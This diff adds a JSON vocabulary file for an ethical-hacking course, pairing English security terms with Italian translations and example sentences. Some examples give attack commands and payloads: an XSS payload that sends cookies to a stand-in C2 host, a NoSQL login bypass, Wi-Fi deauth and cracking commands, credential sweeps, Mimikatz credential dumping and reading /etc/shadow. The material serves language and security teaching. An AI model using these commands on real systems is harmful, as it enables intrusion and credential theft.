@@ -1,0 +1,2133 @@
+{
+  "fixes": [
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "SQL Injection",
+      "set": {
+        "example": "During an authenticated test, the tester confirmed a UNION-based SQL injection that exposed the user table from the orders endpoint. = Durante un test autenticato, il tester ha confermato un'iniezione SQL basata su UNION che ha esposto la tabella utenti dall'endpoint ordini."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "Error-Based SQLi",
+      "set": {
+        "example": "The pentester triggered an error-based SQLi that leaked column names via verbose MySQL stack traces in the response body. = Il pentester ha innescato una SQLi basata su errore che ha rivelato i nomi delle colonne tramite stack trace MySQL verbosi nel body della risposta."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "UNION-Based SQLi",
+      "set": {
+        "example": "A UNION-based SQLi let the tester merge a second SELECT into the original query and dump password hashes. = Una SQLi basata su UNION ha permesso al tester di unire una seconda SELECT nella query originale e di esfiltrare gli hash delle password."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "Boolean-Based Blind SQLi",
+      "set": {
+        "example": "Without visible output, the tester resorted to boolean-based blind SQLi, inferring data one bit at a time from page truth values. = Senza output visibile, il tester ha ripiegato sulla SQLi cieca booleana, deducendo i dati un bit alla volta dai valori di verità della pagina."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "Time-Based Blind SQLi",
+      "set": {
+        "example": "The tester used a time-based blind SQLi with SLEEP(5) to confirm injection on an endpoint that returned no error and no content. = Il tester ha usato una SQLi cieca basata sul tempo con SLEEP(5) per confermare l'iniezione su un endpoint che non restituiva errore né contenuto."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "sqlmap",
+      "set": {
+        "italian": "sqlmap",
+        "example": "The pentester chains sqlmap -u <url> --batch --risk=2 to confirm and dump a vulnerable parameter quickly. = Il pentester concatena sqlmap -u <url> --batch --risk=2 per confermare ed esportare velocemente un parametro vulnerabile."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "Stacked Queries",
+      "set": {
+        "example": "When the backend driver allows multiple statements, stacked queries let an attacker append an INSERT or DROP after the original SELECT. = Quando il driver di backend ammette più istruzioni, le query impilate permettono a un attaccante di aggiungere un INSERT o DROP dopo la SELECT originale."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "NoSQL Injection",
+      "set": {
+        "example": "A NoSQL injection in a MongoDB login form let the tester bypass authentication using a {$ne: null} payload. = Un'iniezione NoSQL in una form di login MongoDB ha permesso al tester di bypassare l'autenticazione con un payload {$ne: null}."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_1",
+      "english": "Out-of-Band SQLi",
+      "set": {
+        "example": "When in-band channels were silenced, the tester used out-of-band SQLi via DNS exfiltration to leak the database schema. = Quando i canali in-band erano silenziati, il tester ha usato la SQLi out-of-band tramite esfiltrazione DNS per estrarre lo schema del database."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "XSS",
+      "set": {
+        "italian": "XSS",
+        "example": "Filtering only <script> tags blocked nothing because the tester delivered XSS via an SVG onload attribute instead. = Filtrare solo i tag <script> non ha bloccato nulla perché il tester ha consegnato l'XSS tramite un attributo onload di un SVG."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "Reflected XSS",
+      "set": {
+        "example": "A reflected XSS in the search parameter let the tester craft a link that executes JavaScript whenever a victim clicks it. = Un XSS riflesso nel parametro di ricerca ha permesso al tester di costruire un link che esegue JavaScript ogni volta che una vittima lo clicca."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "Stored XSS",
+      "set": {
+        "example": "A stored XSS in a forum profile field fired against every admin who opened the moderation panel, escalating to account takeover. = Un XSS persistente in un campo profilo del forum si attivava su ogni admin che apriva il pannello di moderazione, escalando ad account takeover."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "DOM XSS",
+      "set": {
+        "example": "A DOM XSS surfaced when client-side code passed location.hash directly into innerHTML without sanitization. = Un DOM XSS è emerso quando il codice client-side passava location.hash direttamente a innerHTML senza sanitizzazione."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "XSS Payload",
+      "set": {
+        "example": "The tester used the XSS payload <img src=x onerror=fetch('//c2/'+document.cookie)> to exfiltrate session cookies. = Il tester ha usato il payload XSS <img src=x onerror=fetch('//c2/'+document.cookie)> per esfiltrare i cookie di sessione."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "BeEF",
+      "set": {
+        "italian": "BeEF",
+        "example": "After hooking a victim browser, BeEF let the tester pivot from XSS to running browser-side modules like keylogging or webcam access. = Una volta agganciato il browser della vittima, BeEF ha permesso al tester di passare dall'XSS all'esecuzione di moduli browser-side come keylogger o accesso alla webcam."
+      }
+    },
+    {
+      "level": "6",
+      "lesson": "ethack_web_hacking_2",
+      "english": "HttpOnly Cookie",
+      "set": {
+        "example": "Marking session IDs as HttpOnly cookies prevents document.cookie reads, blunting a common goal of XSS payloads. = Marcare gli ID di sessione come cookie HttpOnly impedisce le letture da document.cookie, smussando un obiettivo comune dei payload XSS."
+      }
+    },
+    {
+      "level": "7",
+      "lesson": "ethack_advanced_web_2",
+      "english": "Insecure Deserialization",
+      "set": {
+        "example": "A Java app accepted serialized user objects from a cookie, enabling insecure deserialization that triggered RCE via a known gadget chain. = Un'app Java accettava oggetti utente serializzati da un cookie, abilitando una deserializzazione non sicura che ha portato a RCE tramite una catena gadget nota."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_1",
+      "english": "mitmproxy",
+      "set": {
+        "italian": "mitmproxy",
+        "example": "The tester routed phone traffic through mitmproxy to inspect API calls and craft a tampering payload before replaying it. = Il tester ha instradato il traffico del telefono attraverso mitmproxy per ispezionare le chiamate API e costruire un payload di tampering prima di rigiocarlo."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_1",
+      "english": "MAC Spoofing",
+      "set": {
+        "example": "An attacker on the corporate Wi-Fi performed MAC spoofing to impersonate a quarantined laptop and bypass NAC policy. = Un attaccante sulla Wi-Fi aziendale ha effettuato MAC spoofing per impersonare un laptop in quarantena e bypassare la policy NAC."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_2",
+      "english": "Responder",
+      "set": {
+        "italian": "Responder",
+        "example": "The pentester launched Responder -I eth0 on the user VLAN, capturing NetNTLMv2 hashes from broadcast LLMNR queries within minutes. = Il pentester ha avviato Responder -I eth0 sulla VLAN utenti, catturando hash NetNTLMv2 dalle query LLMNR broadcast in pochi minuti."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_3",
+      "english": "macof",
+      "set": {
+        "italian": "macof",
+        "example": "Running macof against an old unmanaged switch flooded the CAM table and forced it into hub mode for traffic sniffing. = Eseguire macof contro un vecchio switch non gestito ha saturato la CAM table e lo ha forzato in modalità hub per sniffare il traffico."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_3",
+      "english": "Bettercap",
+      "set": {
+        "italian": "Bettercap",
+        "example": "During an internal test, Bettercap automated ARP spoofing and HTTPS downgrade so the team could intercept staging logins. = Durante un test interno, Bettercap ha automatizzato lo spoofing ARP e il downgrade HTTPS così il team poteva intercettare i login di staging."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_3",
+      "english": "Yersinia",
+      "set": {
+        "italian": "Yersinia",
+        "example": "The pentester used Yersinia to forge STP root-bridge BPDUs and demonstrate a Layer 2 takeover of the access switches. = Il pentester ha usato Yersinia per forgiare BPDU root-bridge STP e dimostrare una takeover di Layer 2 degli switch di accesso."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_4",
+      "english": "Chisel",
+      "set": {
+        "italian": "Chisel",
+        "example": "From a foothold without inbound access, the operator used Chisel to tunnel internal RDP back through an HTTPS reverse proxy. = Da un foothold senza accesso entrante, l'operatore ha usato Chisel per tunnelizzare RDP interno attraverso un reverse proxy HTTPS."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_4",
+      "english": "proxychains",
+      "set": {
+        "italian": "proxychains",
+        "example": "Wrapping commands with proxychains nmap -sT let the tester scan an internal subnet through a SOCKS proxy on the jump host. = Avvolgere i comandi con proxychains nmap -sT ha permesso al tester di scansionare una subnet interna attraverso un proxy SOCKS sul jump host."
+      }
+    },
+    {
+      "level": "8",
+      "lesson": "ethack_network_hacking_4",
+      "english": "sshuttle",
+      "set": {
+        "italian": "sshuttle",
+        "example": "With one user SSH credential, sshuttle gave the tester transparent IP-level access to the internal 10.0.0.0/8 range. = Con una sola credenziale SSH utente, sshuttle ha dato al tester accesso IP-level trasparente al range interno 10.0.0.0/8."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_1",
+      "english": "WPA2",
+      "set": {
+        "italian": "WPA2",
+        "example": "A four-way handshake capture from a WPA2-Personal network let the tester crack a weak passphrase offline with hashcat. = Una cattura dell'handshake a quattro vie da una rete WPA2-Personal ha permesso al tester di crackare offline una passphrase debole con hashcat."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_1",
+      "english": "WPA3",
+      "set": {
+        "italian": "WPA3",
+        "example": "WPA3 mitigates offline dictionary attacks by replacing the PSK handshake with Simultaneous Authentication of Equals (SAE). = WPA3 mitiga gli attacchi dizionario offline sostituendo l'handshake PSK con Simultaneous Authentication of Equals (SAE)."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_1",
+      "english": "PMKID",
+      "set": {
+        "italian": "PMKID",
+        "example": "A single beacon with PMKID is enough for hcxdumptool to capture material that hashcat can crack offline, no client deauth needed. = Un singolo beacon con PMKID basta a hcxdumptool per catturare materiale che hashcat può crackare offline, senza serve la deauth dei client."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_1",
+      "english": "EAPOL",
+      "set": {
+        "italian": "EAPOL",
+        "example": "Wireshark captured the four EAPOL frames that make up the WPA2 handshake, which the team fed to aircrack-ng for cracking. = Wireshark ha catturato i quattro frame EAPOL che compongono l'handshake WPA2, che il team ha dato in pasto ad aircrack-ng per il cracking."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "Aircrack-ng",
+      "set": {
+        "italian": "Aircrack-ng",
+        "example": "The auditor used Aircrack-ng to test the resilience of the guest Wi-Fi PSK against a 14-million-word wordlist overnight. = L'auditor ha usato Aircrack-ng per testare la resilienza della PSK Wi-Fi guest contro una wordlist da 14 milioni di parole durante la notte."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "airodump-ng",
+      "set": {
+        "italian": "airodump-ng",
+        "example": "Running airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon captured the target's handshake when a client reconnected. = Eseguire airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon ha catturato l'handshake del target quando un client si è riconnesso."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "aireplay-ng",
+      "set": {
+        "italian": "aireplay-ng",
+        "example": "The auditor sent a deauth burst with aireplay-ng --deauth 5 -a <bssid> wlan0mon to force a client to renegotiate the handshake. = L'auditor ha inviato un burst di deauth con aireplay-ng --deauth 5 -a <bssid> wlan0mon per forzare un client a rinegoziare l'handshake."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "Wifite",
+      "set": {
+        "italian": "Wifite",
+        "example": "During a quick wireless walkthrough, Wifite automated channel hopping, handshake capture, and cracking against every nearby SSID. = Durante un walkthrough wireless veloce, Wifite ha automatizzato l'hopping di canale, la cattura dell'handshake e il cracking contro ogni SSID vicino."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "Kismet",
+      "set": {
+        "italian": "Kismet",
+        "example": "Kismet ran for an hour to map every SSID, hidden BSSID, and rogue access point in range of the office floor. = Kismet ha girato per un'ora per mappare ogni SSID, BSSID nascosto e access point rogue nel raggio del piano dell'ufficio."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "Hashcat",
+      "set": {
+        "italian": "Hashcat",
+        "example": "The wireless team piped the captured PMKID hash to Hashcat -m 22000 with a custom mask to recover the WPA2 passphrase overnight. = Il team wireless ha passato l'hash PMKID catturato a Hashcat -m 22000 con una maschera personalizzata per recuperare la passphrase WPA2 durante la notte."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "hcxdumptool",
+      "set": {
+        "italian": "hcxdumptool",
+        "example": "The auditor ran hcxdumptool -i wlan0mon --enable_status=1 to collect PMKIDs from access points without any client interaction. = L'auditor ha eseguito hcxdumptool -i wlan0mon --enable_status=1 per raccogliere PMKID dagli access point senza nessuna interazione client."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_2",
+      "english": "BSSID",
+      "set": {
+        "italian": "BSSID",
+        "example": "The pentester filtered the capture by the rogue access point's BSSID to isolate frames coming from the malicious twin. = Il pentester ha filtrato la cattura per il BSSID dell'access point rogue per isolare i frame provenienti dal gemello malevolo."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_3",
+      "english": "Wifiphisher",
+      "set": {
+        "italian": "Wifiphisher",
+        "example": "With Wifiphisher running an evil-twin SSID, the team harvested WPA2 credentials from employees prompted by a fake firmware page. = Con Wifiphisher che eseguiva un SSID evil-twin, il team ha raccolto credenziali WPA2 dai dipendenti adescati da una pagina firmware fasulla."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_4",
+      "english": "802.11w",
+      "set": {
+        "italian": "802.11w",
+        "example": "Enabling 802.11w Protected Management Frames blocked deauth attacks that aireplay-ng had relied on during the previous test. = Abilitare i Protected Management Frame 802.11w ha bloccato gli attacchi deauth su cui aireplay-ng aveva fatto affidamento nel test precedente."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_4",
+      "english": "PEAP",
+      "set": {
+        "italian": "PEAP",
+        "example": "Many enterprises still run PEAP-MSCHAPv2, which lets attackers crack captured handshakes with Hashcat once they grab them. = Molte aziende usano ancora PEAP-MSCHAPv2, che permette agli attaccanti di crackare gli handshake catturati con Hashcat una volta acquisiti."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_4",
+      "english": "EAP-TLS",
+      "set": {
+        "italian": "EAP-TLS",
+        "example": "Switching the corporate Wi-Fi from PEAP to EAP-TLS forced every endpoint to present a client certificate, killing credential harvesting. = Passare la Wi-Fi aziendale da PEAP a EAP-TLS ha costretto ogni endpoint a presentare un certificato client, eliminando la raccolta credenziali."
+      }
+    },
+    {
+      "level": "9",
+      "lesson": "ethack_wireless_4",
+      "english": "Wireless Hardening",
+      "set": {
+        "example": "A wireless hardening review disabled WPS, enforced WPA3-Enterprise, and turned on 802.11w on every corporate access point. = Una revisione di hardening wireless ha disabilitato WPS, imposto WPA3-Enterprise e attivato 802.11w su ogni access point aziendale."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Brute Force",
+      "set": {
+        "example": "With rate limiting absent on the API, an attacker mounted a brute force attempt across the entire 4-digit OTP space in under a minute. = Senza rate limiting sull'API, un attaccante ha montato un tentativo di forza bruta sull'intero spazio OTP di 4 cifre in meno di un minuto."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Hybrid Attack",
+      "set": {
+        "example": "A hybrid attack combined the rockyou wordlist with appended digits, recovering passwords like 'summer2024' that pure dictionaries missed. = Un attacco ibrido ha combinato la wordlist rockyou con cifre aggiunte, recuperando password come 'summer2024' che i dizionari puri non avevano colto."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Rainbow Table",
+      "set": {
+        "example": "Pre-computed rainbow tables crack unsalted MD5 hashes in seconds, which is why every modern system salts before hashing. = Le rainbow table pre-computate crackano hash MD5 senza sale in secondi, ed è per questo che ogni sistema moderno usa un sale prima dell'hashing."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Mask Attack",
+      "set": {
+        "example": "Knowing the company policy required '?u?l?l?l?l?l?d?d!', a mask attack drastically narrowed the keyspace versus a blind brute force. = Sapendo che la policy aziendale richiedeva '?u?l?l?l?l?l?d?d!', un attacco con maschera ha ristretto drasticamente il keyspace rispetto a un brute force cieco."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Rule-Based Attack",
+      "set": {
+        "example": "A rule-based attack with best64.rule turned 'password' into thousands of mutations like 'P@ssw0rd!' to crack policy-shaped guesses. = Un attacco basato su regole con best64.rule ha trasformato 'password' in migliaia di mutazioni come 'P@ssw0rd!' per crackare guess conformi alla policy."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Combinator Attack",
+      "set": {
+        "example": "With a combinator attack hashcat -a 1 paired two wordlists together, recovering passphrases like 'summerstorm' that single dicts missed. = Con un attacco combinatorio hashcat -a 1 ha accoppiato due wordlist, recuperando passphrase come 'summerstorm' che i singoli dizionari non avevano colto."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Credential Stuffing",
+      "set": {
+        "example": "Replaying leaked email/password pairs from a 2019 breach against a login API is textbook credential stuffing and still works often. = Rigiocare coppie email/password trapelate in un breach del 2019 contro un'API di login è credential stuffing da manuale e funziona ancora spesso."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Password Spraying",
+      "set": {
+        "example": "To avoid account lockouts, the tester tried 'Spring2024!' once per user against 5000 accounts, classic password spraying. = Per evitare il blocco degli account, il tester ha provato 'Spring2024!' una volta per utente contro 5000 account, password spraying classico."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_1",
+      "english": "Online Attack",
+      "set": {
+        "example": "An online attack hammers the real login endpoint and triggers detection quickly, unlike offline cracking of stolen hashes. = Un attacco online martella l'endpoint di login reale e attiva il rilevamento velocemente, a differenza del cracking offline di hash rubati."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "hashcat",
+      "set": {
+        "english": "hashcat -O Optimized Mode",
+        "italian": "modalità ottimizzata di hashcat (-O)",
+        "example": "Adding -O to hashcat enables optimized kernels that boost speed dramatically but cap password length at 32 characters. = Aggiungere -O a hashcat abilita kernel ottimizzati che accelerano drasticamente ma limitano la lunghezza delle password a 32 caratteri."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "John the Ripper",
+      "set": {
+        "italian": "John the Ripper",
+        "example": "The auditor ran john --format=NT --wordlist=rockyou.txt hashes.txt and recovered 40% of the domain's NTLM hashes in under an hour. = L'auditor ha eseguito john --format=NT --wordlist=rockyou.txt hashes.txt e ha recuperato il 40% degli hash NTLM del dominio in meno di un'ora."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "Hydra",
+      "set": {
+        "italian": "Hydra",
+        "example": "The team fired hydra -L users.txt -P pass.txt ssh://10.0.0.5 to test SSH credentials against a freshly enumerated host. = Il team ha lanciato hydra -L users.txt -P pass.txt ssh://10.0.0.5 per testare credenziali SSH contro un host appena enumerato."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "Medusa",
+      "set": {
+        "italian": "Medusa",
+        "example": "Compared to Hydra, Medusa parallelized SMB login attempts across 16 threads, finishing a spray that would have taken hours sequentially. = Rispetto a Hydra, Medusa ha parallelizzato i tentativi di login SMB su 16 thread, finendo uno spray che sequenzialmente avrebbe richiesto ore."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "Patator",
+      "set": {
+        "italian": "Patator",
+        "example": "The modular design of Patator let the tester brute force a custom JSON login API that Hydra simply could not model out of the box. = Il design modulare di Patator ha permesso al tester di brute-forzare un'API di login JSON personalizzata che Hydra non riusciva a modellare."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "Ncrack",
+      "set": {
+        "italian": "Ncrack",
+        "example": "For network-wide testing, ncrack -p ssh -U users.txt -P pass.txt 10.10.0.0/24 ran a credential sweep across the whole subnet. = Per il test a livello di rete, ncrack -p ssh -U users.txt -P pass.txt 10.10.0.0/24 ha eseguito uno sweep di credenziali sull'intera subnet."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "rockyou.txt",
+      "set": {
+        "italian": "rockyou.txt",
+        "example": "The 14-million-entry rockyou.txt wordlist remains the default first pass for cracking, born from the 2009 RockYou breach. = La wordlist rockyou.txt da 14 milioni di voci rimane il primo passaggio di default per il cracking, nata dal breach RockYou del 2009."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "CeWL",
+      "set": {
+        "italian": "CeWL",
+        "example": "To build a target-specific wordlist, CeWL spidered the company website and extracted every corporate jargon term for hashcat. = Per costruire una wordlist target-specifica, CeWL ha fatto lo spidering del sito aziendale e ha estratto ogni termine di gergo aziendale per hashcat."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_2",
+      "english": "crunch",
+      "set": {
+        "italian": "crunch",
+        "example": "The auditor used crunch 8 8 -t @@@@2024! to generate every 8-char policy-shaped password matching the breach intel they had. = L'auditor ha usato crunch 8 8 -t @@@@2024! per generare ogni password da 8 caratteri conforme alla policy basata sull'intel di breach."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "MD5",
+      "set": {
+        "example": "A legacy CMS still stored passwords as plain MD5, so the dumped database fell to a wordlist in minutes on a single GPU. = Un CMS legacy memorizzava ancora le password come MD5 puro, quindi il database esfiltrato è caduto a una wordlist in pochi minuti su una singola GPU."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "SHA-1",
+      "set": {
+        "example": "Even though SHA-1 is deprecated for signatures, many legacy systems still hash passwords with SHA-1 instead of bcrypt or Argon2. = Anche se SHA-1 è deprecato per le firme, molti sistemi legacy fanno ancora l'hash delle password con SHA-1 invece di bcrypt o Argon2."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "NTLM",
+      "set": {
+        "example": "Hashes in the NTLM format dumped from a Windows SAM can be cracked with hashcat -m 1000 or, more often, simply passed with PtH. = Gli hash in formato NTLM esfiltrati da una SAM Windows possono essere crackati con hashcat -m 1000 o, più spesso, passati con PtH."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "NetNTLMv2",
+      "set": {
+        "example": "Responder captured NetNTLMv2 hashes from LLMNR poisoning, which the team cracked offline with hashcat -m 5600. = Responder ha catturato hash NetNTLMv2 dal poisoning LLMNR, che il team ha crackato offline con hashcat -m 5600."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "Bcrypt",
+      "set": {
+        "example": "The adjustable work factor of bcrypt lets the same hash become 10x slower to crack just by bumping the cost from 10 to 13. = Il work factor regolabile di bcrypt permette allo stesso hash di diventare 10 volte più lento da crackare alzando il cost da 10 a 13."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "Argon2",
+      "set": {
+        "example": "Argon2id is the OWASP-recommended password hash because it is memory-hard and resists both GPU and ASIC cracking. = Argon2id è l'hash password raccomandato da OWASP perché è memory-hard e resiste sia al cracking GPU sia ASIC."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "PBKDF2",
+      "set": {
+        "example": "WPA2 keys are derived with PBKDF2-HMAC-SHA1 at 4096 iterations, which is exactly why offline cracking is feasible but slow. = Le chiavi WPA2 sono derivate con PBKDF2-HMAC-SHA1 a 4096 iterazioni, ed è esattamente per questo che il cracking offline è fattibile ma lento."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "Salt",
+      "set": {
+        "example": "A unique per-user salt forces an attacker to crack each hash separately, neutralizing precomputed rainbow tables entirely. = Un sale unico per utente costringe un attaccante a crackare ogni hash separatamente, neutralizzando completamente le rainbow table precalcolate."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_3",
+      "english": "Pepper",
+      "set": {
+        "example": "Storing a global pepper in a separate secrets vault means even a full DB dump leaves the attacker without enough to crack hashes. = Memorizzare un pepper globale in un vault di segreti separato significa che persino un dump completo del DB lascia l'attaccante senza materiale sufficiente per crackare gli hash."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "unshadow",
+      "set": {
+        "example": "Running unshadow /etc/passwd /etc/shadow merges the two files into the format that John the Ripper expects. = Eseguire unshadow /etc/passwd /etc/shadow unisce i due file nel formato che John the Ripper si aspetta."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "NTDS.dit",
+      "set": {
+        "example": "With domain admin, the team copied NTDS.dit and SYSTEM offline, then used secretsdump to extract every account hash in the forest. = Con domain admin, il team ha copiato NTDS.dit e SYSTEM offline, poi ha usato secretsdump per estrarre ogni hash account della foresta."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "secretsdump",
+      "set": {
+        "example": "Impacket's secretsdump.py extracted NTDS hashes remotely once the team had domain replication rights for a few minutes. = Il secretsdump.py di Impacket ha estratto hash NTDS da remoto una volta che il team ha avuto diritti di replica del dominio per qualche minuto."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "Mimikatz",
+      "set": {
+        "italian": "Mimikatz",
+        "example": "The operator ran Mimikatz sekurlsa::logonpasswords on a freshly compromised server to pull cleartext credentials from LSASS. = L'operatore ha eseguito Mimikatz sekurlsa::logonpasswords su un server appena compromesso per estrarre credenziali in chiaro da LSASS."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "Pass the Hash",
+      "set": {
+        "example": "With an NTLM hash but no plaintext password, the team performed Pass the Hash via crackmapexec to authenticate to a Windows file share. = Con un hash NTLM ma senza password in chiaro, il team ha eseguito Pass the Hash tramite crackmapexec per autenticarsi su una share di file Windows."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "Pass the Ticket",
+      "set": {
+        "example": "Using Rubeus to import a stolen Kerberos TGT, the team performed Pass the Ticket and moved laterally as the victim user. = Usando Rubeus per importare un TGT Kerberos rubato, il team ha eseguito Pass the Ticket e si è mosso lateralmente come l'utente vittima."
+      }
+    },
+    {
+      "level": "10",
+      "lesson": "ethack_password_cracking_4",
+      "english": "Credential Manager",
+      "set": {
+        "example": "Dumping Windows Credential Manager via Mimikatz revealed cached browser logins that bypassed the corporate SSO entirely. = Il dump del Credential Manager di Windows tramite Mimikatz ha rivelato login browser in cache che bypassavano completamente il SSO aziendale."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "Privilege Escalation",
+      "set": {
+        "example": "From a low-privilege web shell, the tester chained a writable cron script for privilege escalation to root within minutes. = Da una web shell a basso privilegio, il tester ha concatenato uno script cron scrivibile per la privilege escalation a root in pochi minuti."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "Vertical Privesc",
+      "set": {
+        "example": "A vertical privesc takes the attacker from www-data straight to root, opening the door to full host compromise. = Una privesc verticale porta l'attaccante da www-data direttamente a root, aprendo la porta alla compromissione completa dell'host."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "Horizontal Privesc",
+      "set": {
+        "example": "Reading another user's session cookie from a shared cache is horizontal privesc: same privilege class, different identity. = Leggere il cookie di sessione di un altro utente dalla cache condivisa è privesc orizzontale: stessa classe di privilegi, identità diversa."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "GTFOBins",
+      "set": {
+        "english": "GTFOBins SUID Entry",
+        "italian": "voce SUID di GTFOBins",
+        "example": "A GTFOBins SUID entry showed exactly which flag of an unexpected binary like vim or find lets a low user escalate to root. = Una voce SUID di GTFOBins ha mostrato esattamente quale flag di un binario inaspettato come vim o find permette a un utente basso di escalare a root."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "sudo -l",
+      "set": {
+        "italian": "sudo -l",
+        "example": "The first thing a Linux operator runs on a foothold is sudo -l to see if the user can launch anything as root unnoticed. = La prima cosa che un operatore Linux esegue su un foothold è sudo -l per vedere se l'utente può lanciare qualcosa come root senza essere notato."
+      }
+    },
+    {
+      "level": "11",
+      "lesson": "ethack_post_exploitation_1",
+      "english": "Kernel Exploit",
+      "set": {
+        "english": "Dirty Pipe Kernel Exploit",
+        "italian": "exploit kernel Dirty Pipe",
